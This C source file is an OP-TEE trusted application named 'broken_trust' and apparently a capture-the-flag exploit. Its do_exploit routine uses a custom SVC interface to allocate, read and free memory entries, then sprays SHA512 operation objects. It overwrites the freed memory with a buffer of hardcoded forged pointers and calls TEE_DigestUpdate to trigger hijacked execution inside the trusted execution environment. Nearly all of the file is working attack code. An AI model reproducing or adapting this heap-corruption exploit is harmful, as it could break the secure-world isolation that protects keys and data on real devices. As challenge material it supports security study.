#include "tee_api_defines.h"
#include "tee_api_types.h"
#include <string.h>
#include <tee_internal_api.h>
#include <tee_internal_api_extensions.h>

#include <broken_trust_ta.h>

/*
 * Called when the instance of the TA is created. This is the first call in
 * the TA.
 */
TEE_Result TA_CreateEntryPoint(void) { return TEE_SUCCESS; }

/*
 * Called when the instance of the TA is destroyed if the TA has not
 * crashed or panicked. This is the last call in the TA.
 */
void TA_DestroyEntryPoint(void) {}

/*
 * Called when a new session is opened to the TA. *sess_ctx can be updated
 * with a value to be able to identify this session in subsequent calls to the
 * TA. In this function you will normally do the global initialization for the
 * TA.
 */
TEE_Result TA_OpenSessionEntryPoint(uint32_t param_types,
                                    TEE_Param __maybe_unused params[4],
                                    void __maybe_unused **sess_ctx) {
  /* Unused parameters */
  (void)param_types;
  (void)&params;
  (void)&sess_ctx;

  /* If return value != TEE_SUCCESS the session will not be created. */
  return TEE_SUCCESS;
}

/*
 * Called when a session is closed, sess_ctx hold the value that was
 * assigned by TA_OpenSessionEntryPoint().
 */
void TA_CloseSessionEntryPoint(void __maybe_unused *sess_ctx) {
  (void)&sess_ctx; /* Unused parameter */
}

// Conversion functions.
static uint32_t high_dword(const uint64_t val) {
  return (val >> 32) & 0xffffffffull;
}
static uint32_t low_dword(const uint64_t val) { return val & 0xffffffffull; }

static uint64_t u64(const char *input) { return *(uint64_t *)input; }
static uint32_t u32(const char *input) { return *(uint32_t *)input; }

static void p64(uint64_t val, char *out_ptr) {
  memcpy(out_ptr, &val, sizeof(uint64_t));
}

static void p32(uint64_t val, char *out_ptr) {
  memcpy(out_ptr, &val, sizeof(uint32_t));
}

#define P64(val, out_ptr)                                                      \
  {                                                                            \
    p64(val, out_ptr);                                                         \
    out_ptr += sizeof(uint64_t);                                               \
  }

static TEE_Result do_svc(uint64_t op, uint64_t id, void *buf, size_t len) {

  // Setup registers for SVC call
  volatile register uint64_t x8 __asm("x8") = 0x45; // SVC number
  volatile register uint64_t x0 __asm("x0") = op;
  volatile register uint64_t x1 __asm("x1") = id;
  volatile register uint64_t x2 __asm("x2") = (uint64_t)buf;
  volatile register uint64_t x3 __asm("x3") = len;

  // Call SVC
  __asm volatile("svc #0"
                 : "=r"(x0) // Output: x0 (return value)
                 : "r"(x0), "r"(x1), "r"(x2), "r"(x3), // Inputs: x0, x1, x2, x3
                   "r"(x8)                             // Inputs: x8
                 : "memory");                          // Clobber: memory

  // Copy return value to res
  return x0;
}

static TEE_Result alloc(uint64_t id, uint64_t len) {
  TEE_Result res = TEE_SUCCESS;

  // Allocate memory
  res = do_svc(0x1, id, NULL, len);
  if (res != TEE_SUCCESS) {
    EMSG("Memory allocation failed: 0x%08x", res);
    return res;
  }

  return TEE_SUCCESS;
}

static TEE_Result free_entry(uint64_t id) {
  TEE_Result res = TEE_SUCCESS;

  res = do_svc(0x2, id, NULL, 0);
  if (res != TEE_SUCCESS) {
    EMSG("Memory free failed: 0x%08x", res);
    return res;
  }

  return TEE_SUCCESS;
}

static TEE_Result write(uint64_t id, void *buf, size_t len) {
  TEE_Result res = TEE_SUCCESS;

  res = do_svc(0x3, id, buf, len);
  if (res != TEE_SUCCESS) {
    EMSG("Memory write failed: 0x%08x", res);
    return res;
  }

  return TEE_SUCCESS;
}

static TEE_Result read(uint64_t id, void *buf, size_t len) {
  TEE_Result res = TEE_SUCCESS;

  res = do_svc(0x4, id, buf, len);
  if (res != TEE_SUCCESS) {
    EMSG("Memory read failed: 0x%08x", res);
    return res;
  }

  return TEE_SUCCESS;
}

void dump_hex(const void *data, size_t size) {
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}

static TEE_Result do_exploit(uint32_t param_types, TEE_Param params[4]) {
  TEE_Result res;

  for (uint32_t i = 0; i < 10; i++) {
    res = alloc(i, 0x1000);
    if (res != TEE_SUCCESS) {
      EMSG("SVC call failed: 0x%08x", res);
      return res;
    }

    res = read(i, params[0].memref.buffer, params[0].memref.size);
    if (res != TEE_SUCCESS) {
      EMSG("SVC call failed: 0x%08x", res);
      return res;
    }

    // res = write(i, data, 0x1000);
    // if (res != TEE_SUCCESS) {
    //   EMSG("SVC call failed: 0x%08x", res);
    //   return res;
    // }

    // dump_hex(params[0].memref.buffer, params[0].memref.size);
  }

  for (uint32_t i = 0; i < 10; i++) {
    res = free_entry(i);
    if (res != TEE_SUCCESS) {
      EMSG("SVC call failed: 0x%08x", res);
      return res;
    }
  }

  const uint32_t total_objects = 10;
  // TEE_ObjectHandle objects[total_objects];
  TEE_OperationHandle objects[total_objects];

  IMSG("Allocating %u objects", total_objects);
  // Allocate a bunch of file objects
  for (uint32_t i = 0; i < total_objects; i++) {
    // char object_id[8];
    // snprintf(object_id, sizeof(object_id), "ID%u", i);
    // res = TEE_CreatePersistentObject(
    //     TEE_STORAGE_PRIVATE, object_id, sizeof(object_id),
    //     TEE_DATA_FLAG_ACCESS_READ | TEE_DATA_FLAG_ACCESS_WRITE |
    //         TEE_DATA_FLAG_ACCESS_WRITE_META,
    //     TEE_HANDLE_NULL, "ZZZZ", 4, &objects[i]);
    res =
        TEE_AllocateOperation(&objects[i], TEE_ALG_SHA512, TEE_MODE_DIGEST, 0);
    if (res != TEE_SUCCESS) {
      EMSG("Object creation failed: 0x%08x", res);
      return res;
    }
  }

  // This data starts at: 0xe1450d0
  char data[0x1000] = {0};
  memset(data, 0x41, sizeof(data));

  for (uint32_t i = 0; i < 458; i++) {
    // 0xE1AD4A8
    p64(0xE1AD6FC, (data + i * 8));
  }

  for (uint32_t i = 375; i < 512; i++) {
    // 0xe146270
    p64(0xe145f20, (data + i * 8));
  }

  IMSG("Writing to objects");
  for (uint32_t i = 0; i < 10; i++) {
    res = write(i, data, 0x1000);
    if (res != TEE_SUCCESS) {
      EMSG("SVC call failed: 0x%08x", res);
      return res;
    }
  }

  // IMSG("Closing objects");
  for (uint32_t i = 0; i < total_objects; i++) {
    TEE_DigestUpdate(objects[i], params[2].memref.buffer, 0x100);
    // TEE_CloseObject(objects[i]);
    // TEE_FreeOperation(objects[i]);
  }
}

/*
 * Called when a TA is invoked. sess_ctx hold that value that was
 * assigned by TA_OpenSessionEntryPoint(). The rest of the paramters
 * comes from normal world.
 */
TEE_Result TA_InvokeCommandEntryPoint(void __maybe_unused *sess_ctx,
                                      uint32_t cmd_id, uint32_t param_types,
                                      TEE_Param params[4]) {
  (void)&sess_ctx; /* Unused parameter */

  IMSG("Received command: %u", cmd_id);

  switch (cmd_id) {
  case TA_BROKEN_TRUST_CMD_EXPLOIT:
    return do_exploit(param_types, params);
  default:
    return TEE_ERROR_BAD_PARAMETERS;
  }
}